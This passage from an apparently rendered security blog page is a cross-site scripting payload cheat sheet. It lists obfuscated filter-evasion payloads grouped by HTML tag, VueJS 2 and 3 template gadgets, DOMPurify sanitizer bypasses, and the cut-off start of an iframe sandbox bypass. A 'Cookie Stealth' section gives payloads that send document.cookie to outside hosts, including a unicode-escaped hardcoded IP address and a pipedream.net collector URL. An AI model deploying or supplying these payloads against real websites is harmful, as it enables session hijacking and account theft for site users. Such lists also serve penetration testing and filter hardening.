class="name">scrit</span>&gt;</span>void&#x27;&#x27;??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;/<span class="name">scipt</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">this</span>[<span class="string">&quot;alert&quot;</span>](<span class="built_in">this</span>[<span class="string">&quot;document&quot;</span>][<span class="string">&quot;cookie&quot;</span>]);</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoMSk=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">%2sscript%2ualert()%2s/script%2u</span><br><span class="line"></span><br><span class="line">img tag</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window[</span>&#x27;<span class="attr">eva</span>&#x27;+&#x27;<span class="attr">l</span>&#x27;](<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">alert,_(/xss/)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">&#x27;e&#x27;</span>+&#x27;<span class="attr">val</span>&#x27;,<span class="attr">_</span>(<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"></span><br><span class="line">svg tag</span><br><span class="line">%u003Csvg onload=alert(1)&gt;</span><br><span class="line">%u3008svg onload=alert(2)&gt; </span><br><span class="line">%uFF1Csvg onload=alert(3)&gt;</span><br><span class="line">&lt;Svg%K9OnLoad=%7Krompt%6K1%6K&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onx</span>=<span class="string">()</span> <span class="attr">onload</span>=<span class="string">window.alert?.()</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">details tag</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top.alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>&#x27;<span class="attr">prompt</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">YWxlcnQoMSk</span>=<span class="string">&#x27;)) &gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=eval(&#x27;</span>\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span> &gt;</span></span><br><span class="line">  </span><br><span class="line">iframe tag</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&#x27;<span class="attr">pt:aler</span>&#x27;,&#x27;<span class="attr">t</span>(<span class="attr">1</span>)&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&#x27;<span class="attr">java</span>&#x27;,&#x27;<span class="attr">script:</span>&#x27;,&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">body tag</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;body/onfocus=alert(1)&gt;</span><br><span class="line">&lt;body/onload=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">href</span>=<span class="string">x</span> %<span class="attr">00</span> <span class="attr">nonafterprint</span>=<span class="string">confirm(document.domain)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">input tag</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onbeforecopy</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;input/autofocus/onfocus=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">  </span><br><span class="line">a tag</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">video tag</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onkeypress</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">/http:\\domain.tld\page/.source+document.cookie</span> &gt;</span></span><br><span class="line"></span><br><span class="line">button tag</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ondblclick</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">object tag</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">&#x27;text/x-scriptlet&#x27;</span> <span class="attr">data</span>=<span class="string">&#x27;http://example.com/xss.html&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">  xss.html -&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">embed tag</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">audio tag</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">textarea tag</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">meter tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">select tag</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">form tag</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">Constructor</span><br><span class="line">&#123;&#123;+constructor.constructor(&quot;alert(document.cookie)&quot;)()+&#125;&#125;</span><br><span class="line">  </span><br><span class="line">Etc</span><br><span class="line">ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6</span><br><span class="line">jaVasCript:/*-/*`/*`/*’/*”/**/(/* */onMouSeoVer=alert(1) )</span><br><span class="line">javascript:setInterval`alert\x28document.cookie\x29`&#x27;</span><br><span class="line">javascript:alert\xdocument.\xookie\x</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">Special char Gadget</span><br><span class="line">c: `$&#123;&#123;&#125;&#125;`[!![]&lt;&lt;!![]&lt;&lt;!![]|!![]]</span><br><span class="line">o: `$&#123;&#123;&#125;&#125;`[!!&#123;&#125;&lt;&lt;![]]</span><br><span class="line">n: `$&#123;[][~[]]&#125;`[!!&#123;&#125;&lt;&lt;![]]</span><br><span class="line">s: `$&#123;!![][~[]]&#125;`[(!![]&lt;&lt;!![])|!![]]</span><br><span class="line">t: `$&#123;![][~[]]&#125;`[!&#123;&#125;&lt;&lt;![]]</span><br><span class="line">r: `$&#123;![][~[]]&#125;`[!!&#123;&#125;&lt;&lt;![]]</span><br><span class="line">u: `$&#123;![][~[]]&#125;`[!!&#123;&#125;&lt;&lt;!![]]</span><br><span class="line">c: `$&#123;&#123;&#125;&#125;`[!![]&lt;&lt;!![]&lt;&lt;!![]|!![]]</span><br><span class="line">t: `$&#123;![][~[]]&#125;`[!&#123;&#125;&lt;&lt;![]]</span><br><span class="line">o: `$&#123;&#123;&#125;&#125;`[!!&#123;&#125;&lt;&lt;![]]</span><br><span class="line">r: `$&#123;![][~[]]&#125;`[!!&#123;&#125;&lt;&lt;![]]</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">fetch(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image).src=<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.get(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">&quot;//domain&quot;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:document.location=&#x27;url&#x27;%2bdocument.cookie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&quot;<span class="attr">pt:document</span>&quot;,&quot;<span class="attr">.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&quot;<span class="attr">java</span>&quot;,&quot;<span class="attr">script:</span>&quot;,&quot;<span class="attr">document.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065&quot;)&gt;</span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="VueJS-script-gadgets"><a href="#VueJS-script-gadgets" class="headerlink" title="VueJS script gadgets"></a>VueJS script gadgets</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">VueJS version 2</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">&quot;_c.constructor`alert(1)`()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">v-on:click</span>=<span class="string">&#x27;_b.constructor`alert(1)`()&#x27;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">v-bind:a</span>=<span class="string">&#x27;_b.constructor`alert(1)`()&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @[<span class="attr">_b.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">:</span>[<span class="attr">_b.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-</span>=<span class="string">_c.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> #[<span class="attr">_c.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:</span>=<span class="string">_c.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()&gt;</span></span><br><span class="line">&#123;&#123;_c.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_b.constructor`alert(1)`()&#125;&#125;</span><br><span class="line">&#123;&#123;_c.constructor`alert(document.currentScript.nonce)`()&#125;&#125; </span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">VueJS version 3</span><br><span class="line"></span><br><span class="line">&#123;&#123;_openBlock.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_createBlock.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_toDisplayString.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_createVNode.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">&quot;_createBlock.constructor`alert(1)`()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @[<span class="attr">_openBlock.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @[<span class="attr">_capitalize.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @<span class="attr">click</span>=<span class="string">_withCtx.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()&gt;</span>click<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @<span class="attr">click</span>=<span class="string">$event.view.alert(1)</span>&gt;</span>click<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">&#123;&#123;_Vue.h.constructor`alert(document.currentScript.nonce)`()&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="DOMPurify-Bypass"><a href="#DOMPurify-Bypass" class="headerlink" title="DOMPurify Bypass"></a>DOMPurify Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;path id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;]]<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Iframe-Sandbox-Bypass"><a href="#Iframe-Sandbox-Bypass" class="headerlink" title=" Iframe Sandbox Bypass"></a><span style="color:#21C587"></span> Iframe Sandbox Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iframe sandbox bypass<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span 